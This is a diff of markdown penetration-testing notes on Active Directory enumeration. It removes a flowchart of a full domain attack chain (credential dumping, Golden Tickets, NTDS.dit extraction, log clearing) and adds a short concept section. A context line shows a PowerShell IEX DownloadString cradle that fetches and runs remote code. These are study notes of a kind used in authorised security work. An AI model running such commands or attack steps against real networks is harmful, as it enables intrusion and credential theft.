@@ -1,93 +1,17 @@
----
-date: 2025-06-08
-Source: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration
----
-
 #Concept/ActiveDirectory
 
-# Flowchart
+# The Concept
 
-```mermaid
-flowchart TD
-    A([Start AD Pentest]) --> B[Network Enumeration]
-    B --> B1["Discover Domain Controllers<br>(nslookup, BloodHound)"]
-    B --> B2["Identify Users & Groups<br>(ldapsearch, PowerView)"]
-    B --> B3["Map Network Shares<br>(net view, smbclient)"]
-    B --> B4["Scan Open Ports/Services<br>(nmap, CrackMapExec)"]
-    B --> B5["Check for Null Session<br>(rpcclient, enum4linux)"]
-    
-    B --> C[Initial Access Phase]
-    C --> C1["Phishing Campaign<br>(Set payload delivery)"]
-    C --> C2["Exploit Public Services<br>(OWA, RDP, VPN vulns)"]
-    C --> C3["Password Attacks<br>(Spraying, Cred Stuffing)"]
-    C --> C4["Abuse Exposed Creds<br>(Git leaks, Pastebin dumps)"]
-    
-    C --> D{Initial Compromise?}
-    D -->|Yes| E[Establish Foothold]
-    D -->|No| B
-    
-    E --> E1["Low-Priv Shell Access<br>(Metasploit, Covenant)"]
-    E --> E2["Credential Harvesting<br>(Mimikatz, LaZagne)"]
-    E --> E3["Establish Persistence<br>(Scheduled Tasks, Services)"]
-    
-    E --> F[Local Enumeration]
-    F --> F1["User Context Checks<br>(whoami /priv, net user)"]
-    F --> F2["OS/Software Audit<br>(systeminfo, chkrootkit)"]
-    F --> F3["Network Config<br>(ipconfig, arp -a)"]
-    F --> F4["Sensitive File Hunt<br>(Unattend.xml, backups)"]
-    
-    F --> G{Privilege Escalation?}
-    G -->|Yes| H[Escalate Privileges]
-    G -->|No| I[Lateral Movement]
-    
-    H --> H1["Kernel Exploits<br>(BeRoot, Watson)"]
-    H --> H2["Token Manipulation<br>(Incognito, RottenPotato)"]
-    H --> H3["Abuse Misconfigurations<br>(AlwaysInstallElevated)"]
-    H --> I
-    
-    I --> I1["Pass-the-Hash<br>(Mimikatz, smbexec)"]
-    I --> I2["Remote Exploitation<br>(PsExec, WMI)"]
-    I --> I3["Delegation Abuse<br>(PrintSpooler, RBCD)"]
-    I --> I4["AppLocker Bypass<br>(InstallUtil, regsvr32)"]
-    
-    I --> J{New Host Compromised?}
-    J -->|Yes| K[Repeat Enumeration]
-    J -->|No| C
-    
-    K --> L{DA Privileges?}
-    L -->|Yes| M[Domain Dominance]
-    L -->|No| F
-    
-    M --> M1["NTDS.dit Extraction<br>(secretsdump, vssadmin)"]
-    M --> M2["Golden Ticket<br>(mimikatz /ptt)"]
-    M --> M3["Trust Abuse<br>(SID History, Forest Trusts)"]
-    M --> N[Post-Exploitation]
-    
-    N --> N1["Data Collection<br>(FileZilla, rclone)"]
-    N --> N2["Backdooring<br>(SSH Keys, GPOs)"]
-    N --> N3["Log Manipulation<br>(wevtutil, clearev)"]
-    N --> Z([End])
-    
-    style A fill:#2ecc71,stroke:#27ae60
-    style C fill:#3498db,stroke:#2980b9
-    style Z fill:#e74c3c,stroke:#c0392b
-    style M fill:#f39c12,stroke:#d35400
-```
+The idea here, as with any other target is to understand the following:
+- **Who** has access to this target, and who else does this target have a relationship with.
+- **What** services/processes this target is running, and what kind of architecture it has.
+- **When** do said services/process run.
+- **Where** on the network this target is.
 
-# Active Directory Enumeration
+Start by looking for the Domain Controllers, Enumerate the running services and check them for anonymous access misconfigurations.
+A lot of information can be gotten out of LDAP queries as well. Most things on LDAP need authentication, but some things like DNS server names, etc can be obtained even without authentication.
 
-Active Directory (AD) is a directory service for Windows enterprise environments that was officially implemented in 2000 with the release of Windows Server 2000 and has been incrementally improved upon with the release of each subsequent server OS since.
-
-## Initial Enumeration
-
-## Key Points to Look Out For
-
-| **Data Point**                  | **Description**                                                                                                                 |
-| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
-| `AD Users`                      | We are trying to enumerate valid user accounts we can target for password spraying.                                             |
-| `AD Joined Computers`           | Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc. |
-| `Key Services`                  | Kerberos, NetBIOS, LDAP, DNS                                                                                                    |
-| `Vulnerable Hosts and Services` | Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)                                          |
+# Application
 
 ## Identifying Hosts
 
@@ -879,6 +803,8 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('ht
 
 # Metasploit
 use post/windows/gather/bloodhound     
+
+# Nextscan also has bloodhound injectors
 ```
 
 ### Custom Queries
@@ -902,7 +828,3 @@ sudo find / -type f -name customqueries.json 2>/dev/null
 ## Additional Notes
 
 If Constrained Language mode is enabled on the target Domain Controller, Powerview will be heavily restricted for Domain enumeration. However, the AD PowerShell module will not be limited and allow Domain enumeration to continue.
-
-## Lab Reviews:
-
-**Ryan412:** [https://github.com/ryan412/ADLabsReview](https://github.com/ryan412/ADLabsReview)
